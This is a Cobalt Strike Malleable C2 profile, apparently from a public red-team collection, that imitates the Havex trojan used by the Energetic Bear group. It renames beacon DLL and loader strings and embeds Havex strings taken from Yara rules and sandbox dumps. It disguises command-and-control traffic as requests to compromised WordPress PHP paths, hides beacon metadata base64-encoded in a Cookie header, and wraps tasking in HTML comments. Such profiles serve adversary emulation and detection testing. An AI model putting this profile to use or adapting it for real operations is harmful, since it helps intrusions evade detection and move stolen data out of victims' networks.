# havex trojan C&C profile
# Actor: Energetic Bear / Crouching Yeti / Dragonfly
# 
# See:
# . http://www.symantec.com/connect/blogs/emerging-threat-dragonfly-energetic-bear-apt-group
# . https://securelist.com/files/2014/07/EB-YetiJuly2014-Public.pdf
# . http://pastebin.com/qCdMwtZ6
# . http://www.crowdstrike.com/sites/all/themes/crowdstrike2/css/imgs/platform/CrowdStrike_Global_Threat_Report_2013.pdf
# . https://github.com/Yara-Rules/rules/blob/master/malware/RAT_Havex.yar
# . http://web.archive.org/web/20170808180137/www.f-secure.com/weblog/archives/00002718.html
# . https://www.virustotal.com/#/file/3d3daee1a38e67707921b222f1685d5bd6328af2fc80d4c11d92dc6a6c289261/details
#
# Author: @armitagehacker

set sleeptime "30000";

set useragent "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 5.2) Java/1.5.0_08";

set pipename "mypipe-f";
set pipename_stager "mypipe-h";

stage {
	# seems legit	
	set compile_time "16 May 2014 9:42:28";

	# make these things havex-ish
	transform-x86 {
		strrep "ReflectiveLoader" "runDll";
		strrep "beacon.dll"       "7CFC52.dll";
	}

	transform-x64 {
		strrep "ReflectiveLoader" "runDll";
		strrep "beacon.x64.dll"   "7CFC52CD3F.dll";
	}
	
	# strings gathered from Yara rules and sandbox string dumps
	stringw "%s <%s> (Type=%i, Access=%i, ID='%s')";
	stringw "%02i was terminated by ThreadManager(2)\n";
	stringw "main sort initialise ...\n";
	stringw "qsort [0x%x, 0x%x] done %d this %d\n";
	stringw "{0x%08x, 0x%08x}";
	stringw "Programm was started at %02i:%02i:%02i\n";
	stringw "a+";
	stringw "%02i:%02i:%02i.%04i:";
	stringw "**************************************************************************\n";
	stringw "Start finging of LAN hosts...\n";
	stringw "Finding was fault. Unexpective error\n";
	stringw "Hosts was't found.\n";
	stringw "\t\t\t\t\t%O2i) [%s]\n";
	stringw "Start finging of OPC Servers...";
	stringw "Was found %i OPC Servers.";
	stringw "\t\t%i) [%s\\%s]\n\t\t\tCLSID:          %s\n";
	stringw "\t\t\tUserType:        %s\n\t\t\tVerIndProgID:    %s\n";
	stringw "OPC Servers not found. Programm finished";
	stringw "Start finging of OPC Tags...";
	stringw "[-]Threads number > Hosts number";
	stringw "[-]Can not get local ip";
	stringw "[!]Start";
	stringw "[+]Get WSADATA";
	stringw "[+]Local:"; 
	stringw "[-]Connection error";
	stringw "Was found %i hosts in LAN:";
	stringw "%s[%s]!!!EXEPTION %i!!!";
	stringw "final combined CRC = 0x%08x";
}

http-stager { 
    
    set uri_x86 "/api/516280565958";
    set uri_x64 "/api/516280565959";

    server {
        header "Cache-Control" "private, max-age=0";
        header "Content-Type" "text/html; charset=utf-8";
        header "Vary" "Accept-Encoding";
        header "Server" "Microsoft-IIS/8.0";
        header "X-Powered-By" "ASP.NET";
        header "Connection" "close";
    }
    client {
        header "Accept-Language" "en-US,en;q=0.5";
        header "Accept-Encoding" "gzip, deflate";
        header "Proxy-Connection" "Keep-Alive";
    }
}

http-get {
	set uri "/include/template/isx.php /wp06/wp-includes/po.php /wp08/wp-includes/dtcla.php";

	client {
		header "Referer" "http://www.google.com";
		header "Accept" "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5";
		header "Accept-Language" "en-us,en;q=0.5";
        # Added additional headers to test parsing for additional UAs passed with `header`
        header "User-Agent" "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 5.2) Java/1.5.0_10";

		# base64 encoded Cookie is not a havex indicator, but a place to stuff our data
		metadata {
			base64;
			header "Cookie";
		}
	}

	server {
		header "Server" "Apache/2.2.26 (Unix)";
		header "X-Powered-By" "PHP/5.3.28";
		header "Cache-Control" "no-cache";
		header "Content-Type" "text/html";
		header "Keep-Alive" "timeout=3, max=100";

		output {
			base64;
			prepend "<html><head><mega http-equiv='CACHE-CONTROL' content='NO-CACHE'></head><body>Sorry, no data corresponding your request.<!--havex";
			append "havex--></body></html>";
			print;
		}
	}
}

# define indicators for an HTTP POST
http-post {
	set uri "/modules/mod_search.php /blog/wp-includes/pomo/src.php /includes/phpmailer/class.pop3.php";

	client {
		header "Content-Type" "application/octet-stream";
        header "User-Agent" "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 5.2) Java/1.5.0_11";
		# transmit our sess id as /whatever.php?id=[identifier]
		id {
			parameter "id";
		}

		# post our output with no real changes
		output {
			print;
		}
	}

	# The server's response to our HTTP POST
	server {
		header "Server" "Apache/2.2.26 (Unix)";
		header "X-Powered-By" "PHP/5.3.28";
		header "Cache-Control" "no-cache";
		header "Content-Type" "text/html";
		header "Keep-Alive" "timeout=3, max=100";

		# this will just print an empty string, meh...
		output {
			prepend "blah blah blah";
			mask;
			base64;
			prepend "<html><head><mega http-equiv='CACHE-CONTROL' content='NO-CACHE'></head><body>Sorry, no data corresponding your request.<!--havex";
			append "havex--></body></html>";
			print;
		}
	}
}